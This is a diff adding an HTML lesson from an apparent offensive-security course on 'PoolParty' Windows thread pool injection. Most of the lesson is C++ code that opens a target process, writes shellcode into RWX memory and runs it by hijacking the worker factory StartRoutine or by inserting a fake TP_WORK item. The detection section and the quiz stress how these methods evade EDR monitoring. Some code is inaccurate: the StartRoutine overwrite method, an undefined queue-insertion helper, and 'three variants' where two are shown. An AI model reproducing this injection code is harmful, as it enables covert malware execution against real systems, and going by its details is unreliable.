@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: Worker Factory &amp; TP_WORK Variants - PoolParty Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F3CA;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f59e0b;--accent2:#d97706;--gradient:linear-gradient(135deg,#f59e0b,#d97706)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>PoolParty Course</h2>
+<span>Thread Pool Injection Masterclass</span>
+</div>
+<a class="home-link" href="../PoolParty_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Injection Landscape</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Thread Pool Architecture</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Thread Pool Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link active" href="module4.html"><span>4. Worker Factory &amp; TP_WORK</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Wait, I/O &amp; ALPC</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Job &amp; Direct Variants</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. TP_TIMER Insertion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: Worker Factory &amp; TP_WORK Variants</h1>
+<p class="subtitle">PoolParty Variants 1&ndash;2: StartRoutine hijacking and TP_WORK item insertion into the target&rsquo;s thread pool.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Master the first two PoolParty variants: hijacking the worker factory&rsquo;s StartRoutine to execute shellcode via a new worker thread (Variant 1), and inserting a crafted TP_WORK item into the target pool&rsquo;s task queue so that an existing worker thread dispatches the attacker&rsquo;s callback (Variant 2). Each variant exploits a different entry point into the thread pool execution path.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Shared Setup: Locating Target Handles</h2>
+
+<p>All three variants require the same preliminary steps to locate the target process&rsquo;s thread pool infrastructure:</p>
+
+<pre><span class="lang-tag">C++</span><code>// Step 1: Open the target process
+HANDLE hProcess = OpenProcess(
+    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
+    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+    FALSE, targetPid);
+
+// Step 2: Enumerate all handles in the system
+PSYSTEM_HANDLE_INFORMATION handleInfo = NULL;
+ULONG bufferSize = 0x10000;
+do {
+    handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
+    status = NtQuerySystemInformation(
+        SystemHandleInformation, handleInfo, bufferSize, &bufferSize);
+    if (status == STATUS_INFO_LENGTH_MISMATCH) {
+        free(handleInfo);
+        bufferSize *= 2;
+    }
+} while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+// Step 3: Find Worker Factory handles belonging to target PID
+for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+    SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
+    if (entry.UniqueProcessId != targetPid) continue;
+    if (entry.ObjectTypeIndex != workerFactoryTypeIndex) continue;
+
+    // Duplicate the handle into our process
+    HANDLE dupHandle;
+    DuplicateHandle(hProcess, (HANDLE)(ULONG_PTR)entry.HandleValue,
+                    GetCurrentProcess(), &dupHandle,
+                    0, FALSE, DUPLICATE_SAME_ACCESS);
+
+    // Query to verify it's the thread pool worker factory
+    WORKER_FACTORY_BASIC_INFORMATION wfbi;
+    NtQueryInformationWorkerFactory(dupHandle,
+        WorkerFactoryBasicInformation,
+        &wfbi, sizeof(wfbi), NULL);
+
+    // Save the handle and information for the variant-specific exploit
+    targetWorkerFactory = dupHandle;
+    targetIocp = wfbi.CompletionPort;
+    targetStartRoutine = wfbi.StartRoutine;
+    targetPoolPtr = wfbi.StartParameter;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>2. Variant 1: Worker Factory StartRoutine Hijack</h2>
+
+<p>This is the most straightforward variant. It overwrites the worker factory&rsquo;s <code>StartRoutine</code> so that new worker threads start executing attacker-controlled code instead of <code>TppWorkerThread</code>.</p>
+
+<div class="diagram">
+<h4>Variant 1 Flow</h4>
+<div class="flow">
+<div class="flow box">Write shellcode<br><small>VirtualAllocEx + WriteProcessMemory</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Set StartRoutine<br><small>NtSetInformationWorkerFactory</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Trigger new thread<br><small>Increase MinThreadCount</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Shellcode runs<br><small>New worker thread</small></div>
+</div>
+</div>
+
+<h3>2.1 Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 1: Worker Factory StartRoutine Hijack
+
+// Step 1: Allocate memory in target for shellcode
+LPVOID remoteShellcode = VirtualAllocEx(
+    hProcess, NULL, shellcodeSize,
+    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+WriteProcessMemory(hProcess, remoteShellcode,
+                   shellcode, shellcodeSize, NULL);
+
+// Step 2: Overwrite the worker factory's StartRoutine
+// The StartRoutine is set via NtSetInformationWorkerFactory
+// with WorkerFactoryBasicInformation class
+// We need to craft a WORKER_FACTORY_BASIC_INFORMATION with
+// the StartRoutine field pointing to our shellcode
+
+// Note: We modify the StartRoutine by setting it in the
+// worker factory information structure
+NtSetInformationWorkerFactory(
+    hWorkerFactory,
+    WorkerFactoryBasicInformation,   // Info class 7
+    &remoteShellcode,                // New StartRoutine
+    sizeof(PVOID));
+
+// Step 3: Force creation of a new worker thread
+// Increase MinimumThreadCount to trigger the factory
+// to create an additional thread
+ULONG newMinThreads = currentThreadCount + 1;
+NtSetInformationWorkerFactory(
+    hWorkerFactory,
+    WorkerFactoryThreadMinimum,      // Info class 1
+    &newMinThreads,
+    sizeof(ULONG));
+
+// The new worker thread starts at our shellcode!</code></pre>
+
+<div class="card warn">
+<h4>Variant 1 Caveat</h4>
+<p>After the shellcode thread starts, the worker factory&rsquo;s StartRoutine remains modified. Any subsequent worker threads created by the pool will also start at the shellcode address. A more careful implementation would restore the original StartRoutine after the first shellcode thread has started, or ensure the shellcode itself sets it back.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Variant 2: TP_WORK Item Insertion</h2>
+
+<p>Instead of hijacking thread creation, Variant 2 inserts a fully crafted <code>TP_WORK</code> structure into the target&rsquo;s thread pool task queue. An existing worker thread picks it up and executes the callback.</p>
+
+<div class="diagram">
+<h4>Variant 2 Flow</h4>
+<div class="flow">
+<div class="flow box">Write shellcode<br><small>+ craft TP_WORK</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Insert into queue<br><small>Modify TP_POOL task list</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Post to IOCP<br><small>NtSetIoCompletion</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback fires<br><small>Worker dispatches</small></div>
+</div>
+</div>
+
+<h3>3.1 Crafting the TP_WORK Structure</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 2: TP_WORK Insertion
+
+// Step 1: Allocate and write shellcode
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Read the target's TP_POOL to get queue addresses
+// We know the TP_POOL address from the worker factory query
+TP_POOL remotePool;
+ReadProcessMemory(hProcess, targetPoolPtr, &remotePool,
+                  sizeof(TP_POOL), NULL);
+
+// Step 3: Craft a TP_WORK structure in the target
+// The Task.WorkCallback must point to our shellcode
+TP_WORK fakeWork = { 0 };
+fakeWork.Task.WorkCallback = (PTP_WORK_CALLBACK)remoteShellcode;
+fakeWork.Task.Context = NULL;
+fakeWork.Pool = (PTP_POOL)targetPoolPtr;
+
+// Allocate space for the fake work item in the target
+LPVOID remoteWork = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteWork, &fakeWork,
+                   sizeof(TP_WORK), NULL);
+
+// Step 4: Insert the work item into the pool's task queue
+// This involves modifying the LIST_ENTRY links in the target's
+// TP_POOL.TaskQueue to include our fake TP_WORK
+TppInsertWorkItemIntoQueue(hProcess, targetPoolPtr, remoteWork);</code></pre>
+
+<h3>3.2 Triggering Execution</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Step 5: Post a completion packet to the IOCP to wake a worker
+// The worker will find our work item in the queue and dispatch it
+
+// Duplicate the target's IOCP handle into our process
+HANDLE localIocp;
+DuplicateHandle(hProcess, remotePool.CompletionPort,
+                GetCurrentProcess(), &localIocp,
+                0, FALSE, DUPLICATE_SAME_ACCESS);
+
+// Post a completion packet to wake a worker thread
+NtSetIoCompletion(localIocp, (ULONG_PTR)remoteWork,
+                  NULL, STATUS_SUCCESS, 0);
+
+// A worker thread wakes up, finds our TP_WORK in the queue,
+// and calls fakeWork.Task.WorkCallback -> our shellcode</code></pre>
+
+<!-- ============================================================ -->
+<h2>4. Comparison of Variants 1 and 2</h2>
+
+<table>
+<tr><th>Property</th><th>Variant 1 (StartRoutine)</th><th>Variant 2 (TP_WORK Insert)</th></tr>
+<tr><td><strong>Execution context</strong></td><td>New worker thread</td><td>Existing worker thread</td></tr>
+<tr><td><strong>Key API</strong></td><td><code>NtSetInformationWorkerFactory</code></td><td><code>NtSetIoCompletion</code></td></tr>
+<tr><td><strong>IOCP interaction</strong></td><td>None</td><td>Posts completion packet</td></tr>
+<tr><td><strong>Queue modification</strong></td><td>None</td><td>Linked list manipulation</td></tr>
+<tr><td><strong>Trigger</strong></td><td>New thread created by factory</td><td>Worker wakes from IOCP</td></tr>
+<tr><td><strong>Timing control</strong></td><td>Immediate (on thread create)</td><td>Immediate (IOCP post wakes thread)</td></tr>
+<tr><td><strong>Side effects</strong></td><td>StartRoutine changed for future threads</td><td>Extra item in queue</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>5. Detection Considerations</h2>
+
+<p>From a defensive perspective, these variants present different detection challenges:</p>
+
+<div class="card">
+<h4>What EDRs See (or Don&rsquo;t See)</h4>
+<ul>
+<li><strong>Variant 1</strong> &mdash; <code>NtSetInformationWorkerFactory</code> is not commonly hooked by EDRs. Thread creation through the worker factory bypasses <code>PsSetCreateThreadNotifyRoutine</code> in some configurations because the thread is created by the kernel&rsquo;s worker factory machinery, not by <code>NtCreateThreadEx</code>.</li>
+<li><strong>Variant 2</strong> &mdash; <code>NtSetIoCompletion</code> is a standard I/O API used by thousands of applications. It is not typically considered an injection vector. The worker thread&rsquo;s call stack shows a clean <code>TppWorkerThread</code> origin.</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: How does Variant 1 trigger execution of the injected shellcode?</p>
+<div class="quiz-btn" data-choice="A">A) By calling CreateRemoteThread</div>
+<div class="quiz-btn" data-choice="B">B) By posting to the IOCP</div>
+<div class="quiz-btn" data-choice="C">C) By increasing MinThreadCount to force the worker factory to create a new thread with the overwritten StartRoutine</div>
+<div class="quiz-btn" data-choice="D">D) By signaling a wait object</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: What is the key difference between Variant 1 and Variant 2?</p>
+<div class="quiz-btn" data-choice="A">A) Variant 1 creates a new thread via the worker factory; Variant 2 reuses an existing worker thread via IOCP posting</div>
+<div class="quiz-btn" data-choice="B">B) Variant 1 is slower than Variant 2</div>
+<div class="quiz-btn" data-choice="C">C) Variant 2 requires kernel-mode access</div>
+<div class="quiz-btn" data-choice="D">D) Variant 1 modifies the IOCP while Variant 2 does not</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: Why is NtSetInformationWorkerFactory effective as an injection vector?</p>
+<div class="quiz-btn" data-choice="A">A) It bypasses all kernel security checks</div>
+<div class="quiz-btn" data-choice="B">B) EDRs do not typically hook or monitor this API as an injection vector</div>
+<div class="quiz-btn" data-choice="C">C) It runs in kernel mode</div>
+<div class="quiz-btn" data-choice="D">D) It is an undocumented API that cannot be detected</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Prev: Thread Pool Internals</a>
+<a class="primary" href="module5.html">Next: Wait, I/O &amp; ALPC &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
